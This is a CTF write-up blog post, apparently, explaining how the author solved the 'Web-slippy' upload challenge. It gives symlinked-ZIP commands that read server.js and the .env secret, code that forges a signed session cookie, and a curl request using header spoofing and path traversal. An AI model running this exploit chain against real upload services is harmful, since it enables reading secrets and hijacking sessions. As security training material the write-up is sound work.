@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <link rel="preload" href="https://yashwanth164.github.io/blog.v3loz1ty/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://yashwanth164.github.io/blog.v3loz1ty/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://yashwanth164.github.io/blog.v3loz1ty/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://yashwanth164.github.io/blog.v3loz1ty/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> TFC CTF Writeup | Velocity Blog</title>
+  <link rel = 'canonical' href = 'https://yashwanth164.github.io/blog.v3loz1ty/posts/ctf/tfc_webchall_writeup/'>
+  <meta name="description" content="This blog site focuses on application security, secure development, and client-side security. Explore best practices, insights on securing web applications, preventing client-side attacks, and building secure software solutions. In addition to these, you will find blogs related to genereal cybersecurity concepts.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:url" content="https://yashwanth164.github.io/blog.v3loz1ty/posts/ctf/tfc_webchall_writeup/">
+  <meta property="og:site_name" content="Velocity Blog">
+  <meta property="og:title" content="TFC CTF Writeup">
+  <meta property="og:description" content="Out of 7 challenges, I have tried out 2 challenges and was able to solve only one challenge. Challenges are bit tricky compated to other CTFs i have played so far.
+Challenge: Web-slippy This challenge allows user to upload zip files. After cheking the index.js file i found that i need to access /debug/files.
+Here in line 68, user can pass query parameter (session_id) in the url and contents of query parameter will be appended to ../uploads but only allowed from 127.0.0.1 and user should be develop.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-09-08T10:00:00+00:00">
+    <meta property="article:modified_time" content="2025-09-08T10:00:00+00:00">
+    <meta property="article:tag" content="ZIP Symlink Attack">
+    <meta property="article:tag" content="LFI With File Upload">
+    <meta property="article:tag" content="CTF">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TFC CTF Writeup">
+  <meta name="twitter:description" content="Out of 7 challenges, I have tried out 2 challenges and was able to solve only one challenge. Challenges are bit tricky compated to other CTFs i have played so far.
+Challenge: Web-slippy This challenge allows user to upload zip files. After cheking the index.js file i found that i need to access /debug/files.
+Here in line 68, user can pass query parameter (session_id) in the url and contents of query parameter will be appended to ../uploads but only allowed from 127.0.0.1 and user should be develop.">
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://yashwanth164.github.io/blog.v3loz1ty/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
+
+  
+   <link rel="stylesheet" href="https://yashwanth164.github.io/blog.v3loz1ty/css/custom.css"> 
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://yashwanth164.github.io/blog.v3loz1ty/images/favicon.ico" />
+
+  
+  
+</head>
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="https://yashwanth164.github.io/blog.v3loz1ty/">Home</a></li>
+         
+        <li><a href="https://yashwanth164.github.io/blog.v3loz1ty/posts">All posts</a></li>
+         
+        <li><a href="https://yashwanth164.github.io/blog.v3loz1ty/posts/ctf">CTF writeups</a></li>
+         
+        <li><a href="https://yashwanth164.github.io/blog.v3loz1ty/about">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://yashwanth164.github.io/blog.v3loz1ty/posts/ctf/scriptctf_webchall_writeups/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fyashwanth164.github.io%2fblog.v3loz1ty%2fposts%2fctf%2ftfc_webchall_writeup%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fyashwanth164.github.io%2fblog.v3loz1ty%2fposts%2fctf%2ftfc_webchall_writeup%2f&text=TFC%20CTF%20Writeup" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fyashwanth164.github.io%2fblog.v3loz1ty%2fposts%2fctf%2ftfc_webchall_writeup%2f&title=TFC%20CTF%20Writeup" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fyashwanth164.github.io%2fblog.v3loz1ty%2fposts%2fctf%2ftfc_webchall_writeup%2f&is_video=false&description=TFC%20CTF%20Writeup" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=TFC%20CTF%20Writeup&body=Check out this article: https%3a%2f%2fyashwanth164.github.io%2fblog.v3loz1ty%2fposts%2fctf%2ftfc_webchall_writeup%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fyashwanth164.github.io%2fblog.v3loz1ty%2fposts%2fctf%2ftfc_webchall_writeup%2f&title=TFC%20CTF%20Writeup" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fyashwanth164.github.io%2fblog.v3loz1ty%2fposts%2fctf%2ftfc_webchall_writeup%2f&title=TFC%20CTF%20Writeup" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fyashwanth164.github.io%2fblog.v3loz1ty%2fposts%2fctf%2ftfc_webchall_writeup%2f&name=TFC%20CTF%20Writeup&description=%3cp%3eOut%20of%207%20challenges%2c%20I%20have%20tried%20out%202%20challenges%20and%20was%20able%20to%20solve%20only%20one%20challenge.%20Challenges%20are%20bit%20tricky%20compated%20to%20other%20CTFs%20i%20have%20played%20so%20far.%3c%2fp%3e%0a%3ch1%20id%3d%22challenge-web-slippy%22%3eChallenge%3a%20Web-slippy%3c%2fh1%3e%0a%3cp%3eThis%20challenge%20allows%20user%20to%20upload%20zip%20files.%20After%20cheking%20the%20index.js%20file%20i%20found%20that%20i%20need%20to%20access%20%3ccode%3e%2fdebug%2ffiles%3c%2fcode%3e.%3c%2fp%3e%0a%3cimg%20src%3d%22%2fimg%2ftfcctf_1.png%22%20width%3d%22700%22%20height%3d%22700%22%20alt%3d%22image%201%22%20class%3d%22rounded-image%22%3e%0d%0a%3cp%3eHere%20in%20line%2068%2c%20user%20can%20pass%20query%20parameter%20%28session_id%29%20in%20the%20url%20and%20contents%20of%20query%20parameter%20will%20be%20appended%20to%20..%2fuploads%20but%20only%20allowed%20from%20%3ccode%3e127.0.0.1%3c%2fcode%3e%20and%20user%20should%20be%20%3ccode%3edevelop%3c%2fcode%3e.%3c%2fp%3e" aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fyashwanth164.github.io%2fblog.v3loz1ty%2fposts%2fctf%2ftfc_webchall_writeup%2f&t=TFC%20CTF%20Writeup" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-web-slippy">Challenge: Web-slippy</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        TFC CTF Writeup
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2025-09-08 10:00:00 &#43;0000 UTC" itemprop="datePublished">2025-09-08</time>
+          
+        </div>
+        
+        
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="https://yashwanth164.github.io/blog.v3loz1ty/tags/zip-symlink-attack" rel="tag">ZIP Symlink attack</a>
+            
+             ,  
+            <a class="tag-link" href="https://yashwanth164.github.io/blog.v3loz1ty/tags/lfi-with-file-upload" rel="tag">LFI with file upload</a>
+            
+             ,  
+            <a class="tag-link" href="https://yashwanth164.github.io/blog.v3loz1ty/tags/ctf" rel="tag">CTF</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <p>Out of 7 challenges, I have tried out 2 challenges and was able to solve only one challenge. Challenges are bit tricky compated to other CTFs i have played so far.</p>
+<h1 id="challenge-web-slippy">Challenge: Web-slippy</h1>
+<p>This challenge allows user to upload zip files. After cheking the index.js file i found that i need to access <code>/debug/files</code>.</p>
+<img src="https://yashwanth164.github.io/blog.v3loz1ty/img/tfcctf_1.png" width="700" height="700" alt="image 1" class="rounded-image">
+<p>Here in line 68, user can pass query parameter (session_id) in the url and contents of query parameter will be appended to ../uploads but only allowed from <code>127.0.0.1</code> and user should be <code>develop</code>.</p>
+<img src="https://yashwanth164.github.io/blog.v3loz1ty/img/tfcctf_2.png" width="700" height="700" alt="image 1" class="rounded-image">
+<p>so I need to access <code>/debug/files</code> as <code>develop</code> user from 127.0.0.1.</p>
+<p>To be <code>develop</code> user, I need to get the connect.sid cookie of <code>develop</code> user. In the code, develop user info is stored in in-memory datastore as shown below.</p>
+<img src="https://yashwanth164.github.io/blog.v3loz1ty/img/tfcctf_3.png" width="700" height="700" alt="image 1" class="rounded-image">
+<p>connect.sid express session value have following format <code>s:sid:signature</code>. I need to find sid of the develop user which is redacted in line 24 in the above image and then sign that sid I get a valid connect.sid cookie.</p>
+<p>Steps:</p>
+<ol>
+<li>Read server.js file to get the sid of develop user.</li>
+<li>Read .env file to get the secrte that is used to sign the sid.</li>
+<li>Use the <code>develop</code> connect.sid cookie to find the flag.</li>
+</ol>
+<h2 id="read-serverjs-file">Read server.js file</h2>
+<p>To read server.js file I will upload a zip file which contains a text file but it points to server.js file using symlink. Run below commands to do that.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>touch tfc1.txt
+</span></span><span style="display:flex;"><span>ln -s ../../server.js tfc1.txt
+</span></span><span style="display:flex;"><span>zip archive1.zip tfc1.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Uploading this zip file, application shows the zip file contents as shown below.</p>
+<img src="https://yashwanth164.github.io/blog.v3loz1ty/img/tfcctf_4.png" width="700" height="700" alt="image 1" class="rounded-image">
+<p>If I click on download, it will download server.js file as tfc1.txt is pointing to relative path of server.js.</p>
+<img src="https://yashwanth164.github.io/blog.v3loz1ty/img/tfcctf_5.png" width="700" height="700" alt="image 1" class="rounded-image">
+<p>I found the sid of develop  and similary I found the secret key in .env file by uploading zip file from below commands.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>touch tfc2.txt
+</span></span><span style="display:flex;"><span>ln -s ../../.env tfc2.txt
+</span></span><span style="display:flex;"><span>zip archive2.zip tfc2.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>sid -&gt; <code>amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E</code>
+secret -&gt; <code>3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b</code></p>
+<p>now, I need to sign this sid with secret to get a valid session token for <code>develop</code> user.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sig</span><span style="color:#f92672">=</span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;cookie-signature&#39;</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">secret</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sid</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E&#39;</span>; 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;s:&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sig</span>.<span style="color:#a6e22e">sign</span>(<span style="color:#a6e22e">sid</span>, <span style="color:#a6e22e">secret</span>));<span style="color:#960050;background-color:#1e0010">&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I got valid session token to be <code>develop</code> user.</p>
+<h2 id="to-find-flag">To find flag</h2>
+<p>Used the develop session token to access /debug/files and flag is stored in a random named directory as specified in the below docker file RUN command.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>FROM node:22-bookworm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>WORKDIR /app
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>COPY src/package*.json ./
+</span></span><span style="display:flex;"><span>RUN npm install
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>COPY src/ .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>EXPOSE <span style="color:#ae81ff">3000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RUN rand_dir<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/</span><span style="color:#66d9ef">$(</span>head /dev/urandom | tr -dc a-z0-9 | head -c 8<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>; mkdir <span style="color:#e6db74">&#34;</span>$rand_dir<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;TFCCTF{Fake_fLag}&#34;</span> &gt; <span style="color:#e6db74">&#34;</span>$rand_dir<span style="color:#e6db74">/flag.txt&#34;</span> <span style="color:#f92672">&amp;&amp;</span> chmod -R +r <span style="color:#e6db74">&#34;</span>$rand_dir<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CMD <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;npm&#34;</span>, <span style="color:#e6db74">&#34;start&#34;</span><span style="color:#f92672">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I will use directory travesal with the query parameter session_id to find the name of the arbitraory direcory name we curl as below</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set SIGNED<span style="color:#f92672">=</span>s:amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E.R3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>curl -i -H <span style="color:#e6db74">&#34;Cookie: connect.sid=%SIGNED%&#34;</span> -H <span style="color:#e6db74">&#34;X-Forwarded-For: 127.0.0.1&#34;</span> <span style="color:#e6db74">&#34;http://127.0.0.1/debug/files?session_id=../../../../&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Found the directory name <code>tlhedn6f</code> and to read the flag I uploaded another zip file.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>touch tfc3.txt
+</span></span><span style="display:flex;"><span>ln -s ../../../tlhedn6f/flag.txt tfc3.txt
+</span></span><span style="display:flex;"><span>zip archive3.zip tfc3.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Upload this archive3.zip file and found the flag <code>TFCCTF{3at_sl1P_h4Ck_r3p3at_5af9f1}</code></p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://yashwanth164.github.io/blog.v3loz1ty/">Home</a></li>
+         
+          <li><a href="https://yashwanth164.github.io/blog.v3loz1ty/posts">All posts</a></li>
+         
+          <li><a href="https://yashwanth164.github.io/blog.v3loz1ty/posts/ctf">CTF writeups</a></li>
+         
+          <li><a href="https://yashwanth164.github.io/blog.v3loz1ty/about">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-web-slippy">Challenge: Web-slippy</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fyashwanth164.github.io%2fblog.v3loz1ty%2fposts%2fctf%2ftfc_webchall_writeup%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fyashwanth164.github.io%2fblog.v3loz1ty%2fposts%2fctf%2ftfc_webchall_writeup%2f&text=TFC%20CTF%20Writeup" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fyashwanth164.github.io%2fblog.v3loz1ty%2fposts%2fctf%2ftfc_webchall_writeup%2f&title=TFC%20CTF%20Writeup" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fyashwanth164.github.io%2fblog.v3loz1ty%2fposts%2fctf%2ftfc_webchall_writeup%2f&is_video=false&description=TFC%20CTF%20Writeup" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=TFC%20CTF%20Writeup&body=Check out this article: https%3a%2f%2fyashwanth164.github.io%2fblog.v3loz1ty%2fposts%2fctf%2ftfc_webchall_writeup%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fyashwanth164.github.io%2fblog.v3loz1ty%2fposts%2fctf%2ftfc_webchall_writeup%2f&title=TFC%20CTF%20Writeup" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fyashwanth164.github.io%2fblog.v3loz1ty%2fposts%2fctf%2ftfc_webchall_writeup%2f&title=TFC%20CTF%20Writeup" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
